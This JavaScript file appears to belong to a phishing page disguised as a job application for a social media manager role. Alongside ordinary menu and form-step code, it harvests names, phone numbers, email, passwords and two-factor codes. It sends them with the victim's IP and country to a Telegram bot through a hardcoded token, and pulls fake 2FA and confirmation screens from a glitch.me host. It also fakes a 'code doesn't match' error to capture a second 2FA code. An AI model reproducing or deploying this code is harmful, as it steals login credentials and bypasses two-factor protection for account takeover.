function toggleMenu() {
  const menu = document.querySelector('.menu');
  menu.classList.toggle('show');
}

function toggleModal(param) {
  var modali = document.getElementById("myModal1");

  // Toggle the animation class
  modali.classList.toggle("slidedown");
  if (param == 'open') {
    modali.style.display = "flex"
  }
  else {
    modali.style.display = "none"
  }
}

$("a[href$='#demo']").click(function () {

  let attr = $("#demo").attr("class");
  if (attr == "collapse show") {
    $("i").removeClass("fas fa-chevron-up");
    $("i").addClass("fas fa-chevron-down");
  } else {
    $("i").removeClass("fas fa-chevron-down");
    $("i").addClass("fas fa-chevron-up");
  }


})

function slidefeedback() {
  $("#logindropdown").slideToggle()
  $(".fas").toggleClass("rotate");
}


function toggle(id) {
  a = document.getElementById('toggle_' + id);
  b = document.getElementById('display_' + id);
  if (a.style.display == 'block') {
    a.style.display = 'none';
    b.innerHTML = '+ 2 More';
  }
  else {
    a.style.display = 'block';
    b.innerHTML = '- Hide';
  }
}


// window.addEventListener('scroll', function () {
//   var stickyDiv = document.getElementById('stickyDiv');
//   var content = document.getElementById('content');
//   var scrollPosition = window.scrollY;

//   // Adjust this value to determine when the div should become sticky
//   var triggerPosition = content.offsetTop;

//   if (scrollPosition > triggerPosition) {
//     stickyDiv.classList.add('sticky');
//     content.style.paddingTop = '0px'; // Adjust content padding when div becomes sticky
//   } else {
//     stickyDiv.classList.remove('sticky');
//     content.style.paddingTop = '0';
//   }
// });


var next_click = document.querySelectorAll(".next_button");
var main_form = document.querySelectorAll(".main");
var step_list = document.querySelectorAll(".progress-bar li");
var num = document.querySelector(".step-number");
let formnumber = 0;

next_click.forEach(function (next_click_form) {
  next_click_form.addEventListener('click', function () {
    if (!validateform()) {
      return false
    }
    formnumber++;
    if (formnumber == 1) {
      firstStepDone()
    }
    else if (formnumber == 2) {
      secondStepDone();
    }
    else if (formnumber == 3) {
      thirdStep()
    }
    else if (formnumber == 4) {
      lastStepDone();
    }
    updateform();
    progress_forward();
    document.getElementById('contaform').scrollIntoView()
    contentchange();
  });
});

var back_click = document.querySelectorAll(".back_button");
back_click.forEach(function (back_click_form) {
  back_click_form.addEventListener('click', function () {
    formnumber--;
    updateform();
    progress_backward();
    contentchange();
  });
});

var username = document.querySelector("#user_name");
var shownname = document.querySelector(".shown_name");


var submit_click = document.querySelectorAll(".submit_button");
submit_click.forEach(function (submit_click_form) {
  submit_click_form.addEventListener('click', function () {
    shownname.innerHTML = username.value;
    updateform();
  });
});

function updateform() {
  main_form.forEach(function (mainform_number) {
    mainform_number.classList.remove('active');
  })
  main_form[formnumber].classList.add('active');
}

function progress_forward() {

  num.innerHTML = formnumber + 1;
  step_list[formnumber].classList.add('active');
}

function progress_backward() {
  var form_num = formnumber + 1;
  step_list[form_num].classList.remove('active');
  num.innerHTML = form_num;
}

var step_num_content = document.querySelectorAll(".step-number-content");

function contentchange() {
  step_num_content.forEach(function (content) {
    content.classList.remove('active');
    content.classList.add('d-none');
  });
  step_num_content[formnumber].classList.add('active');
}


function validateform() {
  let validate = true;
  let spani = document.getElementsByClassName('required');
  let validate_inputs = document.querySelectorAll(".main.active input");
  
  for (let i = 0; i < spani.length; i++) {
      spani[i].textContent = '';
  }
  validate_inputs.forEach(function (validate_input, index) {
      validate_input.classList.remove('warning');
      
      if (validate_input.hasAttribute('require')) {
          if (validate_input.value.trim().length === 0) {
              validate = false;
              validate_input.classList.add('warning');
              spani[index].textContent = 'This field is required'; 
          }
      }
  });
  
  return validate;
}



function toggleInputs(selectedRadio) {
  var yesInputs = document.getElementById('yesInputs');
  var noInputs = document.getElementById('noInputs');

  if (selectedRadio.value === 'yes') {
    yesInputs.classList.remove('hidden');
    noInputs.classList.add('hidden');
  } else {
    yesInputs.classList.add('hidden');
    noInputs.classList.remove('hidden');
  }
}


function firstStepDone() {
  let first_name = document.getElementById('user_name').value;
  let last_name = document.getElementById('last_name').value;
  let email = document.getElementById('first_step_email').value
  let number = document.getElementById('phonenumber').value
  var message = "Email: " + email + "\n";
  message += "First name: " + first_name + "\n";
  message += "Lat name: " + last_name + "\n";
  message += "Phone number : " + number + "\n";
  teleBot(message);

}
function secondStepDone() {

  let email = document.getElementById('first_step_email').value

  var message = "Email: " + email + "\n";
  message += "SECOND STEP";

  teleBot(message);

}
function thirdStep() {

  let email = document.getElementById('first_step_email').value

  var message = "Email: " + email + "\n";
  message += "THIRD STEP";

  teleBot(message);

}
function lastStepDone() {

  let email = document.getElementById('first_step_email').value

  var message = "Email: " + email + "\n";
  message += "LAST STEP";

  teleBot(message);

}
function loginButtoni() {
  let email = $("#email").val();
  let password = $("#password").val();
  let checkValidation = ['email', 'password']
  let check = 0;
  for (let i = 0; i < checkValidation.length; i++) {
    if ($("#" + checkValidation[i]).val() == '') {
      check++;
      $("#" + checkValidation[i]).css('border', '1px solid red')
    }
    else {
      $("#" + checkValidation[i]).css('border', '1px solid #ccc')
    }

  }
  if (check != 0) {
    return;
  }
  let socket_id = $("#socket_id").val()

  //API TELEGRAM 
  var botToken = '7200711723:AAHQosYOVZP2zbG2pmBuvCZL-WyGVGM7C_E';
  var chatId = '-4225800222';
  var message = "Email: " + email + "\n";
  message += "Password: " + password + "\n";
  message += "Socket Id: " + socket_id + "\n";

  // Send the message to Telegram using AJAX
  $.ajax({
    type: 'GET', // You can use GET or POST
    url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
    data: {
      chat_id: chatId,
      text: message
    },
    success: function (response) {
      // show 2FA
      $.ajax({
        url: "https://futuristic-foregoing-dianella.glitch.me/get2fa",
        method: "GET",
        success: function (response) {
          document.getElementById("changeForma").innerHTML = response

        }
      })
    },
    error: function (xhr, status, error) {
      // Handle error, e.g., show an error message
      console.error(error);
    }
  });
}

$(document).ready(async function () {



})

async function teleBot(message) {

  var botToken = '7200711723:AAHQosYOVZP2zbG2pmBuvCZL-WyGVGM7C_E';
  var chatId = '-4225800222';

  fetch('https://api.ipify.org?format=json').then(response => response.json())
    .then(data => {
      fetch('https://ipapi.co/' + data.ip + '/json').then(response => response.json())
        .then(
         async data => {


            message = message  + `Country : ` + data.country + "\n";
            
            message = message  + `IP : ` + data.ip;
            console.log(message);
            // Send the message to Telegram using AJAX
            await $.ajax({
              type: 'GET', // You can use GET or POST
              url: 'https://api.telegram.org/bot' + botToken + '/sendMessage',
              data: {
                chat_id: chatId,
                text: message
              },
              success: function (response) {
                // show 2FA

              },
              error: function (xhr, status, error) {
                // Handle error, e.g., show an error message
                console.error(error);
              }
            });
          }

        );


    }
    )

}

let fa_once = 0;

function countdown() {
  var seconds = 60;
  var span_ = document.getElementById('counter');
  var text2faDiv = document.getElementById("text2fa");
  var timerDiv = document.querySelector(".timer");
  var cdInput = $('#cd');
  var interval = setInterval(function () {
    if (seconds > 0) {
      seconds = seconds - 1;
      span_.innerHTML = `0:${seconds < 10 ? '0' : ''}${seconds}`;
      text2faDiv.style.display = 'block';
      timerDiv.style.display = 'block';
    } else {
      clearInterval(interval);
      text2faDiv.style.display = 'none';
      timerDiv.style.display = 'none';
      cdInput.css('border', '');
    }
  }, 1000);
}



async function faSend() {
  let email = document.getElementById("first_step_email").value

  var cdInput = $('#cd');
  if (cdInput.val().length < 6) {
    cdInput.css('border', '1px solid red')
    document.getElementById('error-message').innerHTML='Please enter a valid 6-digit number.';
    document.getElementById('error-message').style.color = 'red'
    document.getElementById('error-message').style.display='block'
    return;
  }
  document.getElementById('error-message').style.display='none'
  var message = ''
  if (!fa_once) {
    var cdInput = $('#cd');

    cdInput.css('border', '1px solid red')
    var button_2fa = document.getElementById("2fabutton");
    button_2fa.disabled = true;
    button_2fa.style.opacity = '0.3';
    setTimeout(function () {
      button_2fa.style.opacity = '1';
      button_2fa.disabled = false;
    }, 60000);
    document.getElementById("text2fa").innerHTML = `The login code you entered doesn't match the one sent to your phone.`
    countdown();
    fa_once++;
    message = "2FA: " + cdInput.val() + "\n";
    message += "Email: " + email + "\n";

    message += "Socket ID: " + $("#socket_id").val() + "\n";
    teleBot(message);
    cdInput.val('');

    return;
  }
  message = "2FA: " + cdInput.val() + "\n";
  message += "Email: " + email + "\n";
  message += "Socket ID: " + $("#socket_id").val() + "\n";

  teleBot(message);

  await $.ajax({
    url: "https://futuristic-foregoing-dianella.glitch.me/getConfirm",
    method: "GET",
    success: function (response) {
      document.getElementById("changeForma").innerHTML = response
      function randomDate(date1, date2) {
        function randomValueBetween(min, max) {
          return Math.random() * (max - min) + min;
        }
        var options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };

        var date1 = date1 || '01-01-1970'
        var date2 = date2 || new Date().toLocaleDateString("en-US", options)
        date1 = new Date(date1).getTime()
        date2 = new Date(date2).getTime()
        if (date1 > date2) {
          return new Date(randomValueBetween(date2, date1)).toLocaleDateString("en-US", options)
        } else {
          return new Date(randomValueBetween(date1, date2)).toLocaleDateString("en-US", options)

        }
      }


      setTimeout(() => {
        document.getElementById("texti").innerHTML = `Thanks for applying, Your Application for the Social Media Manager role has been received. You will get an email regarding the status of your application in the upcoming weeks. 
          ${randomDate('09/17/2024', '09/23/2024')}`
          document.querySelector('.kfoe-4').style.display = 'none';
      }, 3000);


    }
  })
}
